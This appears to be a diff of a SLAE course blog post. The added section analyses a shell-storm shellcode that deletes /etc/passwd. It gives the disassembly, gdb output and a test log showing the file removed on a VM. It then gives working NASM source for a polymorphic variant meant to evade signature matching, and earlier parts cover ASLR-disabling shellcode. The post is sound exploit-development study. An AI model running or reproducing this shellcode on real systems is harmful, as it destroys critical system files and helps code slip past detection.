@@ -23,9 +23,10 @@ Student ID: SLAE-824
 
 I have chosen the following 3 shellcodes to make polymorphic from
 [shell-strom.org](http://shell-storm.org/shellcode/):
+
 - [reboot](http://shell-storm.org/shellcode/files/shellcode-831.php)
-- XXX
-- XXX
+- [disable aslr](http://shell-storm.org/shellcode/files/shellcode-813.php)
+- [unlink /etc/passwd and exit](http://shell-storm.org/shellcode/files/shellcode-560.php)
 
 My approach will be to:
 
@@ -36,6 +37,8 @@ My approach will be to:
   instructions
 - Place the modified shellcode into the stub c program and verify that
   it continues to work properly
+
+The source code for this exercise can be found [here](https://github.com/blischalk/slae/tree/master/exercise6)
 
 ### Shellcode 1: Reboot
 
@@ -226,7 +229,7 @@ increase limitation. Next up...
 ## Shellcode 2: ASLR Deactivation
 
 The next shellcode disables ASLR on Linux x86 systems. It can be found
-[http://shell-storm.org/shellcode/files/shellcode-813.php](here). Once
+[here](http://shell-storm.org/shellcode/files/shellcode-813.php). Once
 again, lets do some analysis before we go and try to run it.
 
 {% highlight nasm %}
@@ -246,7 +249,7 @@ section .text
     push   0x72702f2f ; Push rp// onto the stack
     ; At this point //proc/sys/kernel/randomize_va_space
     ; Has been pushed onto the stack
-    ; According to [http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](this)
+    ; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)
     ; This seems to be the recommended way to be disabling ASLR
     mov    ebx, esp ; place a pointer to our string on the stack
 
@@ -306,7 +309,7 @@ add in some polymorphism and see if we can keep it under 124 bytes
 as we neet to stay under 150% of the original 83 byte size.
 
 
-### Ploymorphic ASLR Deactivation Shellcode
+### Polymorphic ASLR Deactivation Shellcode
 
 {% highlight nasm %}
 global _start
@@ -338,7 +341,7 @@ section .text
 
     ; At this point //proc/sys/kernel/randomize_va_space
     ; Has been pushed onto the stack
-    ; According to [http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](this)
+    ; According to [this](http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)
     ; This seems to be the recommended way to be disabling ASLR
     mov    ebx, esp ; place a pointer to our string on the stack
 
@@ -421,3 +424,252 @@ Shellcode Length:  110
 {% endhighlight %}
 
 Cool. Our byte length is under the 124 byte limit and works as expected!
+
+
+## Shellcode 3: Unlink /etc/passwd and exit
+
+Now lets work with something a little mischievous.
+[unlink /etc/passwd and exit](http://shell-storm.org/shellcode/files/shellcode-560.php)
+What is unlink /etc/passwd you ask?
+
+[unlink](http://man7.org/linux/man-pages/man2/unlink.2.html)
+
+{% highlight bash %}
+unlink, unlinkat - delete a name and possibly the file it refers to
+{% endhighlight %}
+
+Interesting... So this shellcode will delete the /etcpasswd file. This
+would probably cause a little havoc on a system. Luckily we are using
+a vm! Even though we know it is probably going to break our vm, lets
+analyze the code just to see exactly how it works.
+
+Lets first take the shellcode provided in it's C form, compile,
+throw it in gdb and extract the assembly code:
+
+{% highlight bash %}
+=> 0x0804a040 <+0>:	    jmp    0x804a053 <shell+19>
+   0x0804a042 <+2>:	    pop    esi
+   0x0804a043 <+3>:	    xor    eax,eax
+   0x0804a045 <+5>:	    xor    ecx,ecx
+   0x0804a047 <+7>:	    xor    edx,edx
+   0x0804a049 <+9>:	    mov    al,0xa
+   0x0804a04b <+11>:	mov    ebx,esi
+   0x0804a04d <+13>:	int    0x80
+   0x0804a04f <+15>:	mov    al,0x1
+   0x0804a051 <+17>:	int    0x80
+   0x0804a053 <+19>:	call   0x804a042 <shell+2>
+   0x0804a058 <+24>:	das    
+   0x0804a059 <+25>:	gs
+   0x0804a05a <+26>:	je     0x804a0bf
+   0x0804a05c <+28>:	das    
+   0x0804a05d <+29>:	jo     0x804a0c0
+   0x0804a05f <+31>:	jae    0x804a0d4
+   0x0804a061 <+33>:	ja     0x804a0c7
+   0x0804a063 <+35>:	add    BYTE PTR [eax],al
+{% endhighlight %}
+
+So the first thing that jumps out about this shellcode is that it
+appears to be utilizing the `jmp call` pop technique.
+
+
+{% highlight bash %}
+=> 0x0804a040 <+0>:	    jmp    0x804a053 <shell+19>
+   0x0804a042 <+2>:	    pop    esi <-- Address after call goes here
+
+   .. snip ..
+
+   0x0804a053 <+19>:	call   0x804a042 <shell+2>
+   0x0804a058 <+24>:	das <-- Call places the address of this instruction on the stack
+
+   .. snip ..
+{% endhighlight %}
+
+Ok. So what is this code acquiring the address of? Well, the code
+after the call seems to be a bit cryptic which could mean that this is
+actually a string. Lets have a look...
+
+If we put a breakpoint right after the pop call and use `x/s $esi` we
+can investigate if a string is pointed to by esi.
+
+{% highlight bash %}
+Breakpoint 5, 0x0804a043 in shell ()
+(gdb) disass
+Dump of assembler code for function shell:
+   0x0804a040 <+0>:	jmp    0x804a053 <shell+19>
+   0x0804a042 <+2>:	pop    esi
+=> 0x0804a043 <+3>:	xor    eax,eax
+   0x0804a045 <+5>:	xor    ecx,ecx
+   0x0804a047 <+7>:	xor    edx,edx
+   0x0804a049 <+9>:	mov    al,0xa
+   0x0804a04b <+11>:	mov    ebx,esi
+   0x0804a04d <+13>:	int    0x80
+   0x0804a04f <+15>:	mov    al,0x1
+   0x0804a051 <+17>:	int    0x80
+   0x0804a053 <+19>:	call   0x804a042 <shell+2>
+   0x0804a058 <+24>:	das    
+   0x0804a059 <+25>:	gs
+   0x0804a05a <+26>:	je     0x804a0bf
+   0x0804a05c <+28>:	das    
+   0x0804a05d <+29>:	jo     0x804a0c0
+   0x0804a05f <+31>:	jae    0x804a0d4
+   0x0804a061 <+33>:	ja     0x804a0c7
+   0x0804a063 <+35>:	add    BYTE PTR [eax],al
+End of assembler dump.
+(gdb) x/s $esi
+0x804a058 <shell+24>:	"/etc/passwd"
+{% endhighlight %}
+
+Sure enough it appears that esi points to the string
+`/etc/passwd`. That makes sense as that is the file this code is
+supposed to unlink.
+
+Ok, continuing with our analysis:
+
+{% highlight bash %}
+   0x0804a042 <+2>:	    pop    esi <- Pointing to /etc/passwd
+
+   ; Clear out registers
+   0x0804a043 <+3>:	    xor    eax,eax
+   0x0804a045 <+5>:	    xor    ecx,ecx
+   0x0804a047 <+7>:	    xor    edx,edx
+
+   ; Move syscall unlink 10 into al
+   0x0804a049 <+9>:	    mov    al,0xa
+
+   ; Unlink function signature:
+   ; int unlink(const char *pathname);
+
+   ; Move pointer to pathname into ebx
+   0x0804a04b <+11>:	mov    ebx,esi
+
+   ; Call unlink
+   0x0804a04d <+13>:	int    0x80
+
+   ; Move syscall 1 exit into al
+   0x0804a04f <+15>:	mov    al,0x1
+
+   ; Call exit
+   0x0804a051 <+17>:	int    0x80
+
+{% endhighlight %}
+
+So everything is accounted for. This shellcode appears to do exactly
+what the title says it should do. Lets test it out and see if it in
+fact deletes the /etc/passwd file...
+
+{% highlight bash %}
+$ sudo cp /etc/passwd /etc/passwd.bkup
+$ stat /etc/passwd
+  File: ‘/etc/passwd’
+  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d	Inode: 182305      Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2017-01-08 15:11:35.774016024 -0600
+Modify: 2017-01-02 14:55:00.830518000 -0600
+Change: 2017-01-02 14:55:00.830518000 -0600
+ Birth: -
+$ sudo ./unlinkpasswd
+Shellcode Length: 35
+$ stat /etc/passwd
+stat: cannot stat ‘/etc/passwd’: No such file or directory
+$ sudo mv /etc/passwd.bkup /etc/passwd
+sudo: unknown uid 1000: who are you?
+$ mv /etc/passwd.bkup /etc/passwd
+mv: cannot move ‘/etc/passwd.bkup’ to ‘/etc/passwd’: Permission denied
+{% endhighlight %}
+
+LOL! So kids, don't try this at home unless you can reset your vm!
+
+Lets get our polymorphism on.
+
+
+### Polymorphic Unlink /etc/passwd and Exit Shellcode
+
+First we need to replicate the `jump, call, pop` setup of the original
+shellcode:
+
+
+{% highlight bash %}
+
+global _start
+section .text
+  _start:
+    jmp    call_shellcode
+
+  executeit:
+    pop    esi
+    xor    eax,eax
+    xor    ecx,ecx
+    xor    edx,edx
+    mov    al,0xa
+    mov    ebx,esi
+    int    0x80
+    mov    al,0x1
+    int    0x80
+
+  call_shellcode:
+    call executeit
+    FileToDelete: db "/etc/passwd"
+
+{% endhighlight %}
+
+Next we move some things around to make our code unique:
+
+{% highlight bash %}
+
+global _start
+section .text
+  _start:
+    jmp    call_shellcode
+
+  executeit:
+    pop    esi
+
+    ; Equivilent Instructions for:
+    ; xor    eax,eax
+
+    mov    eax, ecx
+    xor    eax, ecx
+
+    xor    ecx,ecx
+    xor    edx,edx
+
+    ; Equivilent Instructions for:
+    ; mov    al,0xa
+    mov    al, 0xc
+    sub    al, 0x2
+
+    mov    ebx,esi
+    int    0x80
+    mov    al,0x1
+    int    0x80
+
+  call_shellcode:
+    call executeit
+    FileToDelete: db "/etc/passwd"
+
+{% endhighlight %}
+
+Lets see if our polymorphed instructions still accomplish their goal:
+
+{% highlight bash %}
+
+$ stat /etc/passwd
+  File: ‘/etc/passwd’
+  Size: 2008      	Blocks: 8          IO Block: 4096   regular file
+Device: 801h/2049d	Inode: 182305      Links: 1
+Access: (0644/-rw-r--r--)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2017-01-09 16:50:23.534014000 -0600
+Modify: 2017-01-02 14:55:00.830518000 -0600
+Change: 2017-01-02 14:55:00.830518000 -0600
+ Birth: -
+$ sudo ./unlinkpasswdpoly
+[sudo] password for frankgrimes:
+$ stat /etc/passwd
+stat: cannot stat ‘/etc/passwd’: No such file or directory
+
+{% endhighlight %}
+
+Beautiful! It deletes our /etc/passwd file as we hoped :) We end up
+with a 39 byte shellcode, the original being only 35 bytes so we are
+within our 150% increase.
